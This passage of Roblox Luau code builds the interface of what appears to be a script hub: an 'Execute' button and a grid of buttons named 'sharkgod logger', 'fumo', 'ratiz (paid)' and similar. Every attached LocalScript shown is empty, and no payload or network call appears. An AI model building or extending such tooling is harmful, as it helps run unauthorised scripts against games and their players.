LMG2L["TextLabel_1c"]["Position"] = UDim2.new(0, 45, 0, 6);

LMG2L["UIStroke_1d"] = Instance.new("UIStroke", LMG2L["Title_18"]);
LMG2L["UIStroke_1d"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
LMG2L["UIStroke_1d"]["Color"] = Color3.fromRGB(97, 97, 97);
LMG2L["UIStroke_1d"]["Transparency"] = 0.5;

LMG2L["ImageButton3_1e"] = Instance.new("ImageButton", LMG2L["Frame_5"]);
LMG2L["ImageButton3_1e"]["BorderSizePixel"] = 0;
LMG2L["ImageButton3_1e"]["BackgroundColor3"] = Color3.fromRGB(17, 19, 22);
-- LMG2L["ImageButton3_1e"]["Image"] = "rbxassetid://121886242955173";
LMG2L["ImageButton3_1e"]["Size"] = UDim2.new(0, 34, 0, 34);
LMG2L["ImageButton3_1e"]["AutoButtonColor"] = false;
LMG2L["ImageButton3_1e"]["Name"] = [[ImageButton3]];
LMG2L["ImageButton3_1e"]["Position"] = UDim2.new(0, 349, 0, 271);

LMG2L["LocalScript_sd"] = Instance.new("LocalScript", LMG2L["ImageButton3_1e"])

LMG2L["ImageLabelbl"] = Instance.new("ImageLabel", LMG2L["ImageButton3_1e"]);
LMG2L["ImageLabelbl"]["Image"] = "rbxassetid://121886242955173";
LMG2L["ImageLabelbl"]["Size"] = UDim2.new(0, 22, 0, 22);
LMG2L["ImageLabelbl"]["BackgroundTransparency"] = 1;
LMG2L["ImageLabelbl"]["Position"] = UDim2.new(0, 6, 0, 6);

LMG2L["UICorner_1f"] = Instance.new("UICorner", LMG2L["ImageButton3_1e"]);
LMG2L["UICorner_1f"]["CornerRadius"] = UDim.new(0, 6);

LMG2L["UIStroke_20"] = Instance.new("UIStroke", LMG2L["ImageButton3_1e"]);
LMG2L["UIStroke_20"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
LMG2L["UIStroke_20"]["Thickness"] = 1;
LMG2L["UIStroke_20"]["Color"] = Color3.fromRGB(97, 97, 97);
LMG2L["UIStroke_20"]["Transparency"] = 0.5;

LMG2L["exec_21"] = Instance.new("TextButton", LMG2L["Frame_5"]);
LMG2L["exec_21"]["TextStrokeTransparency"] = 0;
LMG2L["exec_21"]["BorderSizePixel"] = 1;
LMG2L["exec_21"]["TextSize"] = 16;
LMG2L["exec_21"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
LMG2L["exec_21"]["BackgroundColor3"] = Color3.fromRGB(17, 19, 22);
LMG2L["exec_21"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Medium, Enum.FontStyle.Normal);
LMG2L["exec_21"]["Text"] = [[Execute]];
LMG2L["exec_21"]["Size"] = UDim2.new(0, 133, 0, 33);
LMG2L["exec_21"]["Name"] = [[exec]];
LMG2L["exec_21"]["AutoButtonColor"] = false;
LMG2L["exec_21"]["Position"] = UDim2.new(0, 6, 0, 272);

LMG2L["UICorner_22"] = Instance.new("UICorner", LMG2L["exec_21"]);
LMG2L["UICorner_22"]["CornerRadius"] = UDim.new(0, 6);

LMG2L["LocalScript_23"] = Instance.new("LocalScript", LMG2L["exec_21"]);

LMG2L["UIStroke_24"] = Instance.new("UIStroke", LMG2L["exec_21"]);
LMG2L["UIStroke_24"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
LMG2L["UIStroke_24"]["Thickness"] = 1;
LMG2L["UIStroke_24"]["Color"] = Color3.fromRGB(97, 97, 97);
LMG2L["UIStroke_24"]["Transparency"] = 0.5;

LMG2L["ImageLabel_25"] = Instance.new("ImageLabel", LMG2L["Frame_5"]);
LMG2L["ImageLabel_25"]["BorderSizePixel"] = 0;
LMG2L["ImageLabel_25"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
LMG2L["ImageLabel_25"]["Image"] = [[rbxassetid://80357785814661]];
LMG2L["ImageLabel_25"]["Size"] = UDim2.new(0, 220, 0, 190);
LMG2L["ImageLabel_25"]["BackgroundTransparency"] = 1;
LMG2L["ImageLabel_25"]["ImageTransparency"] = 0.35;
LMG2L["ImageLabel_25"]["Position"] = UDim2.new(0, 124, 0, 51);

function EnableDrag(frame)
	local dragging
	local dragInput
	local dragStart
	local startPos

	local function update(input)
		local delta = input.Position - dragStart
		local targetPos = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
		
		-- Tweening for smoothness
		local tweenInfo = TweenInfo.new(0.15, Enum.EasingStyle.Quint, Enum.EasingDirection.Out)
		TweenService:Create(frame, tweenInfo, {Position = targetPos}):Play()
	end

	frame.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			dragStart = input.Position
			startPos = frame.Position

			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end)

	frame.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			dragInput = input
		end
	end)

	UserInputService.InputChanged:Connect(function(input)
		if input == dragInput and dragging then
			update(input)
		end
	end)
end


local LMG = {};

-- Players.greguiscool.PlayerGui.ScreenGui.Frame
LMG["Frame_2"] = Instance.new("Frame", LMG2L["Main_2"]);
LMG["Frame_2"]["BorderSizePixel"] = 0;
LMG["Frame_2"]["BackgroundColor3"] = Color3.fromRGB(27, 28, 33);
LMG["Frame_2"]["Size"] = UDim2.new(0, 346, 0, 224);
LMG["Frame_2"]["Position"] = UDim2.new(0, 496, 0, 0);


-- Players.greguiscool.PlayerGui.ScreenGui.Frame.UICorner
LMG["UICorner_3"] = Instance.new("UICorner", LMG["Frame_2"]);
LMG["UICorner_3"]["CornerRadius"] = UDim.new(0, 6);


-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame
LMG["ScrollingFrame_4"] = Instance.new("ScrollingFrame", LMG["Frame_2"]);
LMG["ScrollingFrame_4"]["BorderSizePixel"] = 0;
LMG["ScrollingFrame_4"]["BackgroundColor3"] = Color3.fromRGB(19, 21, 0);
LMG["ScrollingFrame_4"]["AutomaticCanvasSize"] = Enum.AutomaticSize.Y;
LMG["ScrollingFrame_4"]["Size"] = UDim2.new(0, 332, 0, 170);
LMG["ScrollingFrame_4"]["Position"] = UDim2.new(0, 6, 0, 36);
LMG["ScrollingFrame_4"]["ScrollBarThickness"] = 1;


-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.Logger
LMG["Logger_5"] = Instance.new("TextButton", LMG["ScrollingFrame_4"]);
LMG["Logger_5"]["TextWrapped"] = true;
LMG["Logger_5"]["BorderSizePixel"] = 0;
LMG["Logger_5"]["TextSize"] = 18;
LMG["Logger_5"]["TextScaled"] = true;
LMG["Logger_5"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
LMG["Logger_5"]["BackgroundColor3"] = Color3.fromRGB(19, 21, 24);
LMG["Logger_5"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Medium, Enum.FontStyle.Normal);
LMG["Logger_5"]["Size"] = UDim2.new(0, 66, 0, 42);
LMG["Logger_5"]["Text"] = [[sharkgod logger]];
LMG["Logger_5"]["Name"] = [[Logger]];


-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.Logger.UICorner
LMG["UICorner_6"] = Instance.new("UICorner", LMG["Logger_5"]);
LMG["UICorner_6"]["CornerRadius"] = UDim.new(0, 6);


-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.Logger.LocalScript
LMG["LocalScript_7"] = Instance.new("LocalScript", LMG["Logger_5"]);



-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.Logger.UIStroke
LMG["UIStroke_8"] = Instance.new("UIStroke", LMG["Logger_5"]);
LMG["UIStroke_8"]["Transparency"] = 0.5;
LMG["UIStroke_8"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
LMG["UIStroke_8"]["Color"] = Color3.fromRGB(98, 98, 98);


-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.FSEV2
LMG["FSEV2_9"] = Instance.new("TextButton", LMG["ScrollingFrame_4"]);
LMG["FSEV2_9"]["TextWrapped"] = true;
LMG["FSEV2_9"]["BorderSizePixel"] = 0;
LMG["FSEV2_9"]["TextSize"] = 18;
LMG["FSEV2_9"]["TextScaled"] = true;
LMG["FSEV2_9"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
LMG["FSEV2_9"]["BackgroundColor3"] = Color3.fromRGB(19, 21, 24);
LMG["FSEV2_9"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Medium, Enum.FontStyle.Normal);
LMG["FSEV2_9"]["Size"] = UDim2.new(0, 66, 0, 42);
LMG["FSEV2_9"]["Text"] = [[fumo]];
LMG["FSEV2_9"]["Name"] = [[FSEV2]];


-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.FSEV2.UICorner
LMG["UICorner_a"] = Instance.new("UICorner", LMG["FSEV2_9"]);
LMG["UICorner_a"]["CornerRadius"] = UDim.new(0, 6);


-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.FSEV2.LocalScript
LMG["LocalScript_b"] = Instance.new("LocalScript", LMG["FSEV2_9"]);



-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.FSEV2.UIStroke
LMG["UIStroke_c"] = Instance.new("UIStroke", LMG["FSEV2_9"]);
LMG["UIStroke_c"]["Transparency"] = 0.5;
LMG["UIStroke_c"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
LMG["UIStroke_c"]["Color"] = Color3.fromRGB(98, 98, 98);


-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.UIStroke
LMG["UIStroke_d"] = Instance.new("UIStroke", LMG["ScrollingFrame_4"]);
LMG["UIStroke_d"]["Transparency"] = 0.5;
LMG["UIStroke_d"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
LMG["UIStroke_d"]["Color"] = Color3.fromRGB(98, 98, 98);


-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.UICorner
LMG["UICorner_e"] = Instance.new("UICorner", LMG["ScrollingFrame_4"]);
LMG["UICorner_e"]["CornerRadius"] = UDim.new(0, 6);


-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.UIGridLayout
LMG["UIGridLayout_f"] = Instance.new("UIGridLayout", LMG["ScrollingFrame_4"]);
LMG["UIGridLayout_f"]["CellSize"] = UDim2.new(0, 61, 0, 40);
LMG["UIGridLayout_f"]["FillDirectionMaxCells"] = 5;
LMG["UIGridLayout_f"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
LMG["UIGridLayout_f"]["CellPadding"] = UDim2.new(0, 4, 0, 3);


-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.Abbie fpe
LMG["Abbie fpe_10"] = Instance.new("TextButton", LMG["ScrollingFrame_4"]);
LMG["Abbie fpe_10"]["TextWrapped"] = true;
LMG["Abbie fpe_10"]["BorderSizePixel"] = 0;
LMG["Abbie fpe_10"]["TextSize"] = 18;
LMG["Abbie fpe_10"]["TextScaled"] = true;
LMG["Abbie fpe_10"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
LMG["Abbie fpe_10"]["BackgroundColor3"] = Color3.fromRGB(19, 21, 24);
LMG["Abbie fpe_10"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Medium, Enum.FontStyle.Normal);
LMG["Abbie fpe_10"]["Size"] = UDim2.new(0, 66, 0, 42);
LMG["Abbie fpe_10"]["Text"] = [[fpe abbie]];
LMG["Abbie fpe_10"]["Name"] = [[Abbie fpe]];


-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.Abbie fpe.UICorner
LMG["UICorner_11"] = Instance.new("UICorner", LMG["Abbie fpe_10"]);
LMG["UICorner_11"]["CornerRadius"] = UDim.new(0, 6);


-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.Abbie fpe.LocalScript
LMG["LocalScript_12"] = Instance.new("LocalScript", LMG["Abbie fpe_10"]);



-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.Abbie fpe.UIStroke
LMG["UIStroke_13"] = Instance.new("UIStroke", LMG["Abbie fpe_10"]);
LMG["UIStroke_13"]["Transparency"] = 0.5;
LMG["UIStroke_13"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
LMG["UIStroke_13"]["Color"] = Color3.fromRGB(98, 98, 98);


-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.Miss Circle
LMG["Miss Circle_14"] = Instance.new("TextButton", LMG["ScrollingFrame_4"]);
LMG["Miss Circle_14"]["TextWrapped"] = true;
LMG["Miss Circle_14"]["BorderSizePixel"] = 0;
LMG["Miss Circle_14"]["TextSize"] = 18;
LMG["Miss Circle_14"]["TextScaled"] = true;
LMG["Miss Circle_14"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
LMG["Miss Circle_14"]["BackgroundColor3"] = Color3.fromRGB(19, 21, 24);
LMG["Miss Circle_14"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Medium, Enum.FontStyle.Normal);
LMG["Miss Circle_14"]["Size"] = UDim2.new(0, 66, 0, 42);
LMG["Miss Circle_14"]["Text"] = [[miss circle]];
LMG["Miss Circle_14"]["Name"] = [[Miss Circle]];


-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.Miss Circle.UICorner
LMG["UICorner_15"] = Instance.new("UICorner", LMG["Miss Circle_14"]);
LMG["UICorner_15"]["CornerRadius"] = UDim.new(0, 6);


-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.Miss Circle.LocalScript
LMG["LocalScript_16"] = Instance.new("LocalScript", LMG["Miss Circle_14"]);



-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.Miss Circle.UIStroke
LMG["UIStroke_17"] = Instance.new("UIStroke", LMG["Miss Circle_14"]);
LMG["UIStroke_17"]["Transparency"] = 0.5;
LMG["UIStroke_17"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
LMG["UIStroke_17"]["Color"] = Color3.fromRGB(98, 98, 98);


-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.Aiden
LMG["Aiden_18"] = Instance.new("TextButton", LMG["ScrollingFrame_4"]);
LMG["Aiden_18"]["TextWrapped"] = true;
LMG["Aiden_18"]["BorderSizePixel"] = 0;
LMG["Aiden_18"]["TextSize"] = 18;
LMG["Aiden_18"]["TextScaled"] = true;
LMG["Aiden_18"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
LMG["Aiden_18"]["BackgroundColor3"] = Color3.fromRGB(19, 21, 24);
LMG["Aiden_18"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Medium, Enum.FontStyle.Normal);
LMG["Aiden_18"]["Size"] = UDim2.new(0, 66, 0, 42);
LMG["Aiden_18"]["Text"] = [[aiden]];
LMG["Aiden_18"]["Name"] = [[Aiden]];


-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.Aiden.UICorner
LMG["UICorner_19"] = Instance.new("UICorner", LMG["Aiden_18"]);
LMG["UICorner_19"]["CornerRadius"] = UDim.new(0, 6);


-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.Aiden.LocalScript
LMG["LocalScript_1a"] = Instance.new("LocalScript", LMG["Aiden_18"]);



-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.Aiden.UIStroke
LMG["UIStroke_1b"] = Instance.new("UIStroke", LMG["Aiden_18"]);
LMG["UIStroke_1b"]["Transparency"] = 0.5;
LMG["UIStroke_1b"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
LMG["UIStroke_1b"]["Color"] = Color3.fromRGB(98, 98, 98);


-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.boderman exe
LMG["boderman exe_1c"] = Instance.new("TextButton", LMG["ScrollingFrame_4"]);
LMG["boderman exe_1c"]["TextWrapped"] = true;
LMG["boderman exe_1c"]["BorderSizePixel"] = 0;
LMG["boderman exe_1c"]["TextSize"] = 18;
LMG["boderman exe_1c"]["TextScaled"] = true;
LMG["boderman exe_1c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
LMG["boderman exe_1c"]["BackgroundColor3"] = Color3.fromRGB(19, 21, 24);
LMG["boderman exe_1c"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Medium, Enum.FontStyle.Normal);
LMG["boderman exe_1c"]["Size"] = UDim2.new(0, 66, 0, 42);
LMG["boderman exe_1c"]["Text"] = [[boderman exe]];
LMG["boderman exe_1c"]["Name"] = [[boderman exe]];


-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.boderman exe.UICorner
LMG["UICorner_1d"] = Instance.new("UICorner", LMG["boderman exe_1c"]);
LMG["UICorner_1d"]["CornerRadius"] = UDim.new(0, 6);


-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.boderman exe.LocalScript
LMG["LocalScript_1e"] = Instance.new("LocalScript", LMG["boderman exe_1c"]);



-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.boderman exe.UIStroke
LMG["UIStroke_1f"] = Instance.new("UIStroke", LMG["boderman exe_1c"]);
LMG["UIStroke_1f"]["Transparency"] = 0.5;
LMG["UIStroke_1f"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
LMG["UIStroke_1f"]["Color"] = Color3.fromRGB(98, 98, 98);


-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.prototype
LMG["prototype_20"] = Instance.new("TextButton", LMG["ScrollingFrame_4"]);
LMG["prototype_20"]["TextWrapped"] = true;
LMG["prototype_20"]["BorderSizePixel"] = 0;
LMG["prototype_20"]["TextSize"] = 18;
LMG["prototype_20"]["TextScaled"] = true;
LMG["prototype_20"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
LMG["prototype_20"]["BackgroundColor3"] = Color3.fromRGB(19, 21, 24);
LMG["prototype_20"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Medium, Enum.FontStyle.Normal);
LMG["prototype_20"]["Size"] = UDim2.new(0, 66, 0, 42);
LMG["prototype_20"]["Text"] = [[prototype]];
LMG["prototype_20"]["Name"] = [[prototype]];


-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.prototype.UICorner
LMG["UICorner_21"] = Instance.new("UICorner", LMG["prototype_20"]);
LMG["UICorner_21"]["CornerRadius"] = UDim.new(0, 6);


-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.prototype.LocalScript
LMG["LocalScript_22"] = Instance.new("LocalScript", LMG["prototype_20"]);



-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.prototype.UIStroke
LMG["UIStroke_23"] = Instance.new("UIStroke", LMG["prototype_20"]);
LMG["UIStroke_23"]["Transparency"] = 0.5;
LMG["UIStroke_23"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
LMG["UIStroke_23"]["Color"] = Color3.fromRGB(98, 98, 98);


-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.f.e.n
LMG["f.e.n_24"] = Instance.new("TextButton", LMG["ScrollingFrame_4"]);
LMG["f.e.n_24"]["TextWrapped"] = true;
LMG["f.e.n_24"]["BorderSizePixel"] = 0;
LMG["f.e.n_24"]["TextSize"] = 18;
LMG["f.e.n_24"]["TextScaled"] = true;
LMG["f.e.n_24"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
LMG["f.e.n_24"]["BackgroundColor3"] = Color3.fromRGB(19, 21, 24);
LMG["f.e.n_24"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Medium, Enum.FontStyle.Normal);
LMG["f.e.n_24"]["Size"] = UDim2.new(0, 66, 0, 42);
LMG["f.e.n_24"]["Text"] = [[f.e.n]];
LMG["f.e.n_24"]["Name"] = [[f.e.n]];


-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.f.e.n.UICorner
LMG["UICorner_25"] = Instance.new("UICorner", LMG["f.e.n_24"]);
LMG["UICorner_25"]["CornerRadius"] = UDim.new(0, 6);


-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.f.e.n.LocalScript
LMG["LocalScript_26"] = Instance.new("LocalScript", LMG["f.e.n_24"]);



-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.f.e.n.UIStroke
LMG["UIStroke_27"] = Instance.new("UIStroke", LMG["f.e.n_24"]);
LMG["UIStroke_27"]["Transparency"] = 0.5;
LMG["UIStroke_27"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
LMG["UIStroke_27"]["Color"] = Color3.fromRGB(98, 98, 98);


-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.ratiz
LMG["ratiz_28"] = Instance.new("TextButton", LMG["ScrollingFrame_4"]);
LMG["ratiz_28"]["TextWrapped"] = true;
LMG["ratiz_28"]["BorderSizePixel"] = 0;
LMG["ratiz_28"]["TextSize"] = 18;
LMG["ratiz_28"]["TextScaled"] = true;
LMG["ratiz_28"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
LMG["ratiz_28"]["BackgroundColor3"] = Color3.fromRGB(19, 21, 24);
LMG["ratiz_28"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Medium, Enum.FontStyle.Normal);
LMG["ratiz_28"]["Size"] = UDim2.new(0, 66, 0, 42);
LMG["ratiz_28"]["Text"] = [[ratiz (paid)]];
LMG["ratiz_28"]["Name"] = [[ratiz]];


-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.ratiz.UICorner
LMG["UICorner_29"] = Instance.new("UICorner", LMG["ratiz_28"]);
LMG["UICorner_29"]["CornerRadius"] = UDim.new(0, 6);


-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.ratiz.LocalScript
LMG["LocalScript_2a"] = Instance.new("LocalScript", LMG["ratiz_28"]);



-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.ratiz.UIStroke
LMG["UIStroke_2b"] = Instance.new("UIStroke", LMG["ratiz_28"]);
LMG["UIStroke_2b"]["Transparency"] = 0.5;
LMG["UIStroke_2b"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
LMG["UIStroke_2b"]["Color"] = Color3.fromRGB(98, 98, 98);


-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.stummy guns
LMG["stummy guns_2c"] = Instance.new("TextButton", LMG["ScrollingFrame_4"]);
LMG["stummy guns_2c"]["TextWrapped"] = true;
LMG["stummy guns_2c"]["BorderSizePixel"] = 0;
LMG["stummy guns_2c"]["TextSize"] = 18;
LMG["stummy guns_2c"]["TextScaled"] = true;
LMG["stummy guns_2c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
LMG["stummy guns_2c"]["BackgroundColor3"] = Color3.fromRGB(19, 21, 24);
LMG["stummy guns_2c"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Medium, Enum.FontStyle.Normal);
LMG["stummy guns_2c"]["Size"] = UDim2.new(0, 66, 0, 42);
LMG["stummy guns_2c"]["Text"] = [[stummy guns]];
LMG["stummy guns_2c"]["Name"] = [[stummy guns]];


-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.stummy guns.UICorner
LMG["UICorner_2d"] = Instance.new("UICorner", LMG["stummy guns_2c"]);
LMG["UICorner_2d"]["CornerRadius"] = UDim.new(0, 6);


-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.stummy guns.LocalScript
LMG["LocalScript_2e"] = Instance.new("LocalScript", LMG["stummy guns_2c"]);



-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.stummy guns.UIStroke
LMG["UIStroke_2f"] = Instance.new("UIStroke", LMG["stummy guns_2c"]);
LMG["UIStroke_2f"]["Transparency"] = 0.5;
LMG["UIStroke_2f"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
LMG["UIStroke_2f"]["Color"] = Color3.fromRGB(98, 98, 98);


-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.the imposter
LMG["the imposter_30"] = Instance.new("TextButton", LMG["ScrollingFrame_4"]);
LMG["the imposter_30"]["TextWrapped"] = true;
LMG["the imposter_30"]["BorderSizePixel"] = 0;
LMG["the imposter_30"]["TextSize"] = 18;
LMG["the imposter_30"]["TextScaled"] = true;
LMG["the imposter_30"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
LMG["the imposter_30"]["BackgroundColor3"] = Color3.fromRGB(19, 21, 24);
LMG["the imposter_30"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Medium, Enum.FontStyle.Normal);
LMG["the imposter_30"]["Size"] = UDim2.new(0, 66, 0, 42);
LMG["the imposter_30"]["Text"] = [[the imposter]];
LMG["the imposter_30"]["Name"] = [[the imposter]];


-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.the imposter.UICorner
LMG["UICorner_31"] = Instance.new("UICorner", LMG["the imposter_30"]);
LMG["UICorner_31"]["CornerRadius"] = UDim.new(0, 6);


-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.the imposter.LocalScript
LMG["LocalScript_32"] = Instance.new("LocalScript", LMG["the imposter_30"]);



-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.the imposter.UIStroke
LMG["UIStroke_33"] = Instance.new("UIStroke", LMG["the imposter_30"]);
LMG["UIStroke_33"]["Transparency"] = 0.5;
LMG["UIStroke_33"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
LMG["UIStroke_33"]["Color"] = Color3.fromRGB(98, 98, 98);


-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.starfish
LMG["starfish_34"] = Instance.new("TextButton", LMG["ScrollingFrame_4"]);
LMG["starfish_34"]["TextWrapped"] = true;
LMG["starfish_34"]["BorderSizePixel"] = 0;
LMG["starfish_34"]["TextSize"] = 18;
LMG["starfish_34"]["TextScaled"] = true;
LMG["starfish_34"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
LMG["starfish_34"]["BackgroundColor3"] = Color3.fromRGB(19, 21, 24);
LMG["starfish_34"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Medium, Enum.FontStyle.Normal);
LMG["starfish_34"]["Size"] = UDim2.new(0, 66, 0, 42);
LMG["starfish_34"]["Text"] = [[starfish]];
LMG["starfish_34"]["Name"] = [[starfish]];


-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.starfish.UICorner
LMG["UICorner_35"] = Instance.new("UICorner", LMG["starfish_34"]);
LMG["UICorner_35"]["CornerRadius"] = UDim.new(0, 6);


-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.starfish.LocalScript
LMG["LocalScript_36"] = Instance.new("LocalScript", LMG["starfish_34"]);



-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.starfish.UIStroke
LMG["UIStroke_37"] = Instance.new("UIStroke", LMG["starfish_34"]);
LMG["UIStroke_37"]["Transparency"] = 0.5;
LMG["UIStroke_37"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
LMG["UIStroke_37"]["Color"] = Color3.fromRGB(98, 98, 98);


-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.sonic eyx v2
LMG["sonic eyx v2_38"] = Instance.new("TextButton", LMG["ScrollingFrame_4"]);
LMG["sonic eyx v2_38"]["TextWrapped"] = true;
LMG["sonic eyx v2_38"]["BorderSizePixel"] = 0;
LMG["sonic eyx v2_38"]["TextSize"] = 18;
LMG["sonic eyx v2_38"]["TextScaled"] = true;
LMG["sonic eyx v2_38"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
LMG["sonic eyx v2_38"]["BackgroundColor3"] = Color3.fromRGB(19, 21, 24);
LMG["sonic eyx v2_38"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Medium, Enum.FontStyle.Normal);
LMG["sonic eyx v2_38"]["Size"] = UDim2.new(0, 66, 0, 42);
LMG["sonic eyx v2_38"]["Text"] = [[sonic eyx v2]];
LMG["sonic eyx v2_38"]["Name"] = [[sonic eyx v2]];


-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.sonic eyx v2.UICorner
LMG["UICorner_39"] = Instance.new("UICorner", LMG["sonic eyx v2_38"]);
LMG["UICorner_39"]["CornerRadius"] = UDim.new(0, 6);


-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.sonic eyx v2.LocalScript
LMG["LocalScript_3a"] = Instance.new("LocalScript", LMG["sonic eyx v2_38"]);



-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.sonic eyx v2.UIStroke
LMG["UIStroke_3b"] = Instance.new("UIStroke", LMG["sonic eyx v2_38"]);
